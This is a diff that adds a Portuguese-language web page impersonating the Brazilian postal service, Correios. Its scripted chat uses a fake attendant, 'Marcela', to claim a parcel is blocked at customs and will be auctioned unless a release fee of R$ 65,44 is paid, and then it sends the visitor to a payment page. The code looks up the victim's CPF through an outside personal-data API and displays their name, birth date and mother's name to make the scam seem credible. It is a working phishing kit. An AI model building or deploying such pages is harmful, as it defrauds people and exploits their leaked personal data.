@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Canal Seguro Correios</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+    }
+    .header-logo {
+      background: #e0e0e0;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+    }
+    .header-logo img {
+      height: 80px;
+    }
+    .header-logo span {
+      color: #003366;
+      font-size: 22px;
+      font-weight: bold;
+      margin-left: 15px;
+    }
+    .header-title {
+      background: #003366;
+      color: white;
+      padding: 10px 20px;
+      font-size: 12px;
+    }
+    .chat-container {
+      max-width: 500px;
+      margin: 30px auto;
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      overflow-y: auto;
+      max-height: 80vh;
+    }
+    .message {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 20px;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: fadeInUp 0.3s forwards;
+    }
+    .avatar {
+      width: 40px;
+      height: 40px;
+      margin-right: 10px;
+      border-radius: 50%;
+      overflow: hidden;
+      flex-shrink: 0;
+    }
+    .avatar img {
+      width: 100%;
+      height: 100%;
+    }
+    .bubble {
+      background: #e6f2ff;
+      padding: 12px 15px;
+      border-radius: 15px;
+      position: relative;
+    }
+    .typing {
+      display: flex;
+      margin-top: -10px;
+      margin-left: 50px;
+      font-size: 13px;
+      color: #666;
+    }
+    .btn {
+      background: #003366;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 10px 0 20px auto;
+      display: block;
+      max-width: max-content;
+    }
+    .btn:disabled {
+      background: #ccc;
+    }
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    .loading-btn {
+      background: #e6f2ff;
+      color: #003366;
+      border: none;
+      padding: 10px;
+      border-radius: 10px;
+      margin: 10px 0;
+      font-size: 15px;
+      position: relative;
+      transition: background 0.3s, color 0.3s;
+    }
+    .loading-btn.success {
+      background: #d4edda;
+      color: #155724;
+    }
+    .dots::after {
+      content: "⏳ Carregando...";
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    /* NOVO - Estilo do overlay de carregamento */
+    #loading-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255, 255, 255, 0.8);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .loading-box {
+      background: #003366;
+      color: white;
+      padding: 20px 30px;
+      border-radius: 15px;
+      font-size: 18px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      animation: pulse 1s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.05); opacity: 0.7; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    @media (max-width: 600px) {
+      .chat-container {
+        margin: 10px;
+        padding: 15px;
+        max-height: 80vh;
+      }
+      .header-title {
+        font-size: 11px;
+        text-align: center;
+      }
+      .header-logo img {
+        height: 70px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div id="loading-overlay">
+  <div class="loading-box">
+    ⏳ Aguarde, Carregando suas informações...
+  </div>
+</div>
+
+<div class="header-logo">
+  <img src="unnamed.png" alt="Correios Logo" />
+  <span>Canal Seguro Correios</span>
+</div>
+<div class="header-title">
+  Portal Correios &gt; Importação
+</div>
+
+<div class="chat-container" id="chat"></div>
+
+<script>
+  const messages = [
+    "Canal Seguro dos Correios",
+    "Olá, eu sou a <strong>Marcela</strong>, atendente dos Correios.",
+    "Foi localizada Encomenda(s) pendente(s) nesse CPF.",
+    "<strong>Deseja continuar o atendimento?</strong>",
+    { type: "button", text: "Sim", next: "consultarCPF" },
+    "Identificamos que sua mercadoria foi <strong>Taxada</strong>.",
+    "Caso esteja correto clique no botão abaixo para <strong>confirmar</strong>.",
+    { type: "button", text: "Confirmar", next: true },
+    { type: "status-loading" },
+    "✅ Sua verificação foi concluída com sucesso.",
+    "<strong>Identificamos que sua mercadoria foi bloqueada</strong> na Alfândega devido a irregularidades no processo de importação.",
+    "Após esse termo de ciência ela irá para o leilão dos correios devido a práticas ilegais.",
+    "Solicitamos a regularização do seu objeto para evitar transtornos posteriores a esse aviso.",
+    "Os Correios não se responsabilizam pela perda da mercadoria em caso de inadimplência do consumidor.",
+    "<strong>Clique no botão abaixo para saber</strong>",
+    { type: "button", text: "Por que tenho que pagar essa taxa?", next: true },
+    "<strong>1.</strong> A mercadoria chega no Brasil e é enviada para o CEINT, localizado em Curitiba.",
+    "Assim que os produtos chegam no CEINT, eles passam por um processo de verificação se a documentação está correta. Depois disso, avalia-se se o produto está sujeito à tributação.",
+    "<strong>2.</strong> O consumidor é notificado dos custos adicionais. Depois da verificação dos dados, o consumidor é notificado da situação do pedido, através da Guia de Rastreamento.",
+    "<strong>3.</strong> Assim que o pagamento da taxa de liberação é efetuado, o processo de entrega é retomado.",
+    "<strong>Clique no botão abaixo para liberação</strong>",
+    { type: "button", text: "Liberar minha importação", next: true },
+    { type: "status-loading" },
+    "Vamos iniciar seu processo de liberação.",
+    "O cálculo do valor total das taxas é feito da seguinte maneira:",
+    "<strong>Impostos Federais:</strong> R$ 28,75",
+    "<strong>Despacho Postal:</strong> R$ 22,90",
+    "<strong>Taxa de Liberação:</strong> R$ 13,79",
+    "<strong>TOTAL: R$ 65,44</strong><br><br>Após o pagamento da taxa, em até <strong>3 dias úteis</strong> você receberá sua encomenda.",
+    "Agora você será direcionado(a) para a página de pagamento. Sua mercadoria voltará ao trânsito de entrega!",
+    "<strong>Clique no botão abaixo</strong>",
+    { type: "button", text: "Prosseguir para pagamento", next: false }
+  ];
+
+  const chat = document.getElementById("chat");
+  let index = 0;
+
+  function scrollToBottom() {
+    chat.scrollTo({ top: chat.scrollHeight, behavior: "smooth" });
+  }
+
+  function createMessage(text) {
+    const msg = document.createElement("div");
+    msg.className = "message";
+
+    const avatar = document.createElement("div");
+    avatar.className = "avatar";
+    avatar.innerHTML = `<img src="unnamed.png" />`;
+
+    const bubble = document.createElement("div");
+    bubble.className = "bubble";
+    bubble.innerHTML = text;
+
+    msg.appendChild(avatar);
+    msg.appendChild(bubble);
+    chat.appendChild(msg);
+    scrollToBottom();
+  }
+
+  function createTyping(callback) {
+    const typing = document.createElement("div");
+    typing.className = "typing";
+    typing.innerHTML = "Digitando...";
+    chat.appendChild(typing);
+    scrollToBottom();
+
+    setTimeout(() => {
+      typing.remove();
+      callback();
+    }, 1800);
+  }
+
+  function createButton(text, callback) {
+    const btn = document.createElement("button");
+    btn.className = "btn";
+    btn.textContent = text;
+    btn.onclick = () => {
+      btn.disabled = true;
+      btn.style.opacity = 0.6;
+      callback();
+    };
+    chat.appendChild(btn);
+    scrollToBottom();
+  }
+
+  function createLoadingStatus() {
+    createTyping(() => {
+      const btn = document.createElement("button");
+      btn.className = "loading-btn dots";
+      btn.textContent = "⌛ Aguarde... Estamos fazendo a verificação no sistema";
+      chat.appendChild(btn);
+      scrollToBottom();
+
+      setTimeout(() => {
+        btn.classList.remove("dots");
+        btn.classList.add("success");
+        btn.textContent = "✅ Verificação concluída";
+        index++;
+        showMessage();
+      }, 2500);
+    });
+  }
+
+  function consultarCPF() {
+    createTyping(() => {
+      const cpf = localStorage.getItem('cpfDigitado')?.replace(/\D/g, '');
+      if (!cpf) {
+        createMessage("<strong>Erro:</strong> CPF não encontrado. Retorne e digite novamente.");
+        return;
+      }
+
+      fetch(`http://api.dbconsultas.com/api/v1/bff45415-5262-43ff-8d1e-a1f91f03ec2b/cpf/${cpf}`)
+        .then(res => res.json())
+        .then(data => {
+          const nome = data.nome || "Não disponível";
+          const nascimento = data.nascimento || "Não disponível";
+          const mae = data.mae || "Não disponível";
+          const info = `<strong>Confirme seus dados:</strong><br><strong>Nome:</strong> ${nome}<br><strong>Data de Nascimento:</strong> ${nascimento}<br><strong>Nome da Mãe:</strong> ${mae}`;
+          createMessage(info);
+          index++;
+          showMessage();
+        })
+        .catch(() => {
+          createMessage("<strong>Erro:</strong> Não foi possível consultar os dados do CPF no momento.");
+          index++;
+          showMessage();
+        });
+    });
+  }
+
+  function showMessage() {
+    if (index >= messages.length) return;
+
+    const item = messages[index];
+
+    if (typeof item === "string") {
+      index++;
+      createTyping(() => {
+        createMessage(item);
+        setTimeout(showMessage, 500);
+      });
+    } else if (typeof item === "object" && item.type === "button") {
+      index++;
+      createButton(item.text, () => {
+        if (item.next === "consultarCPF") {
+          consultarCPF();
+        } else {
+          showMessage();
+        }
+      });
+    } else if (typeof item === "object" && item.type === "status-loading") {
+      index++;
+      createLoadingStatus();
+    }
+  }
+
+  // Inicia após o carregamento
+  window.addEventListener("load", () => {
+    const loading = document.getElementById("loading-overlay");
+    setTimeout(() => {
+      loading.style.display = "none";
+      showMessage();
+    }, 10000);
+  });
+</script>
+
+</body>
+</html>
+<script src="consulta.js"></script>
